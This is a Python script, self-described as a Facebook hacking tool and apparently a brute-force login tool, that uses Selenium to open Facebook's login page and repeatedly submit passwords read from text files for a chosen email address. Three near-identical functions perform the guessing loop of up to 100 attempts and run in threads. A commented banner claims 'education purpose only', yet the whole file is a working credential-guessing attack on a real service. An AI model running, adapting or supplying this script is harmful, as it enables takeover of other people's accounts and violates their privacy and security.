#from typing import KeysView
from selenium.webdriver import Firefox
from selenium.webdriver.common.by import By
import time
from selenium.webdriver.firefox.options import Options
from threading import Thread
#import pyautogui
#from selenium.webdriver.common.keys import Keys

# Create a FirefoxOptions object and set the '--headless' option
options = Options()
options.add_argument('--headless')



# print("""
# ███████████████████████████████████████████████████████████████████████████████████████████████████████████████
# █▄─▄▄─██▀▄─██─▄▄▄─█▄─▄▄─█▄─▄─▀█─▄▄─█─▄▄─█▄─█─▄███▄─▄─▀█▄─▄▄▀█▄─██─▄█─▄─▄─█▄─▄▄─███▄─▄▄─█─▄▄─█▄─▄▄▀█─▄▄▄─█▄─▄▄─█
# ██─▄████─▀─██─███▀██─▄█▀██─▄─▀█─██─█─██─██─▄▀█████─▄─▀██─▄─▄██─██─████─████─▄█▀████─▄███─██─██─▄─▄█─███▀██─▄█▀█
# ▀▄▄▄▀▀▀▄▄▀▄▄▀▄▄▄▄▄▀▄▄▄▄▄▀▄▄▄▄▀▀▄▄▄▄▀▄▄▄▄▀▄▄▀▄▄▀▀▀▄▄▄▄▀▀▄▄▀▄▄▀▀▄▄▄▄▀▀▀▄▄▄▀▀▄▄▄▄▄▀▀▀▄▄▄▀▀▀▄▄▄▄▀▄▄▀▄▄▀▄▄▄▄▄▀▄▄▄▄▄▀
#                     █████████████████████████████████████████████████████████████
#                     ██▀▄─██─▄─▄─█─▄─▄─██▀▄─██─▄▄▄─█▄─█─▄███─▄─▄─█─▄▄─█─▄▄─█▄─▄███
#                     ██─▀─████─█████─████─▀─██─███▀██─▄▀██████─███─██─█─██─██─██▀█
#                     ▀▄▄▀▄▄▀▀▄▄▄▀▀▀▄▄▄▀▀▄▄▀▄▄▀▄▄▄▄▄▀▄▄▀▄▄▀▀▀▀▄▄▄▀▀▄▄▄▄▀▄▄▄▄▀▄▄▄▄▄
# """)

# print("""
#                 ╭┳━┳╱╱╱╱╱╱╱╱╱╱╱╱╱╭━━╮╱╭╮╭╮╱╱╱╱╱╭━┳┳╮╱╱╭━┳╮╱╭━┳╮
#                 ┃┃┃┃┣━┳╮╭━┳━┳━━┳━╮┃╭╮┣┳┫╰┫╰┳━┳┳╮┃╋┣┫╰┳━┫━┫╰╮┃┃┃┣━┳━┳━╮╭╮
#                 ┃┃┃┃┃┻┫╰┫━┫╋┃┃┃┃┻┫┃┣┫┃┃┃╭┫┃┃┻┫╭╯┃╮┫┃╭┫┻╋━┃┃┃┃┃┃┃┻┫╋┃╋╰┫╰╮
#                 ╰━┻━┻━┻━┻━┻━┻┻┻┻━╯╰╯╰┻━┻━┻┻┻━┻╯╱╰┻┻┻━┻━┻━┻┻╯╰┻━┻━┫╭┻━━┻━╯
#                 ╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╰╯
                
#                 """)

# print('\033[1;31m' + '######made for education purpose only######' + '\033[0m')
# print('\033[1;33m' + '....................................................................................................................................................................' + '\033[0m')
def hacker1(input):
    driver = Firefox(executable_path='D:/New folder(3)')#GIVE PATH  newdriver = Firefox(executable_path='D:/New folder(3)',options = options) if you want to use it in background
    driver.get("https://www.facebook.com/login")
    # email_element = driver.find_element(By.ID,'email')
    
    

    a_file = open('password.txt', "r")
    list_of_lists = []

    attempts = 0
    # Set the maximum number of attempts
    while True:
        try:
            profile_name = driver.find_element(By.CSS_SELECTOR,'li.x1iyjqo2:nth-child(1) > span:nth-child(1) > div:nth-child(1) > a:nth-child(2) > span:nth-child(1) > svg:nth-child(1) > path:nth-child(1)')
            print('Login successful')
            break  # Exit the loop
        except:
            
            time.sleep(2)
            email_element = driver.find_element(By.ID,'email')

            email_element.clear()
            email_element.send_keys(input)
            for line in a_file:
        
        

                stripped_line = line.strip()
                if stripped_line == "":
                    continue
                
                list_of_lists.append([stripped_line])
            
            max_attempts = 100
            time.sleep(2)
            password_element = driver.find_element(By.CSS_SELECTOR,'#pass')

            #attempts += 0
            # val2 = input(f"Enter  password again:try no {attempts+1}:Max is 10: ")  # Get the password again
            # password_element.send_keys(val2)  # Enter the password
            print(f"Trying password from Text file::::pass {attempts+1} = {list_of_lists[attempts]} ")
            password_element.send_keys(list_of_lists[attempts])
            time.sleep(4)
                
            login_button = driver.find_element(By.NAME,"login")
            login_button.click()
            time.sleep(7)
            attempts += 1
            if attempts >= max_attempts:
                    print("Maximum number of attempts reached")
                    break
            print('Login unsuccessful')
    a_file.close()

    driver.quit()
def hacker2(input2):
    newdriver = Firefox(executable_path='D:/New folder(3)')

    newdriver.get("https://www.facebook.com/login")
    

    a_file = open('password1.txt', "r")
    list_of_lists = []

    attempts = 0
    # Set the maximum number of attempts
    while True:
        try:
            profile_name = newdriver.find_element(By.CSS_SELECTOR,'li.x1iyjqo2:nth-child(1) > span:nth-child(1) > div:nth-child(1) > a:nth-child(2) > span:nth-child(1) > svg:nth-child(1) > path:nth-child(1)')
            print('Login successful')
            break  # Exit the loop
        except:
            
            time.sleep(2)
            email_element = newdriver.find_element(By.ID,'email')

            email_element.clear()
            email_element.send_keys(input2)
            for line in a_file:
        
        

                stripped_line = line.strip()
                if stripped_line == "":
                    continue
                
                list_of_lists.append([stripped_line])
            
            max_attempts = 100
            time.sleep(2)
            password_element = newdriver.find_element(By.CSS_SELECTOR,'#pass')

            #attempts += 0
            # val2 = input(f"Enter  password again:try no {attempts+1}:Max is 10: ")  # Get the password again
            # password_element.send_keys(val2)  # Enter the password
            print(f"Trying password from Text file::::pass {attempts+2} = {list_of_lists[attempts]} ")
            password_element.send_keys(list_of_lists[attempts])
            time.sleep(4)
                
            login_button = newdriver.find_element(By.NAME,"login")
            login_button.click()
            time.sleep(8)
            attempts += 1
            if attempts >= max_attempts:
                    print("Maximum number of attempts reached")
                    break
            print ("login unsucessful")
    a_file.close()

    newdriver.quit()
def hacker3(input3):
    newdriver2 = Firefox(executable_path='D:/New folder(3)')

    newdriver2.get("https://www.facebook.com/login")
    

    a_file = open('password2.txt', "r")
    list_of_lists = []

    attempts = 0
    # Set the maximum number of attempts
    while True:
        try:
            
            print("Login done")
            
            profile_name = newdriver2.find_element(By.CSS_SELECTOR,'li.x1iyjqo2:nth-child(1) > span:nth-child(1) > div:nth-child(1) > a:nth-child(2) > span:nth-child(1) > svg:nth-child(1) > path:nth-child(1)')
            
            break  # Exit the loop
        except:
            
            time.sleep(2)
            email_element = newdriver2.find_element(By.ID,'email')

            email_element.clear()
            email_element.send_keys(input3)
            for line in a_file:
        
        

                stripped_line = line.strip()
                if stripped_line == "":
                    continue
                
                list_of_lists.append([stripped_line])
            
            max_attempts = 100
            time.sleep(2)
            password_element = newdriver2.find_element(By.CSS_SELECTOR,'#pass')

            #attempts += 0
            # val2 = input(f"Enter  password again:try no {attempts+1}:Max is 10: ")  # Get the password again
            # password_element.send_keys(val2)  # Enter the password
            print(f"Trying password from Text file::::pass {attempts+3} = {list_of_lists[attempts]} ")
            password_element.send_keys(list_of_lists[attempts])
            time.sleep(6)
                
            login_button = newdriver2.find_element(By.NAME,"login")
            login_button.click()
            time.sleep(15)
            attempts += 1
            if attempts >= max_attempts:
                    print("Maximum number of attempts reached")
                    break
            print('Login unsuccessful')
            
    a_file.close()

    newdriver2.quit()
    
            
if __name__ =="__main__":
    
    input4 = input("enter email or password or h for help:")
    if input4 == "h":
        print("This is a facebook hacking tool")
        exit()

    # t1 = Thread(target=hacker1, args=(input4,))
    # t2 = Thread(target=hacker2, args=(input4,))
    t3 = Thread(target=hacker3, args=(input4,))
    
    # t1.start()
    # t2.start()
    t3.start()
    # t1.join()
    # t2.join()
    t3.join()
    print("done")          
            
        


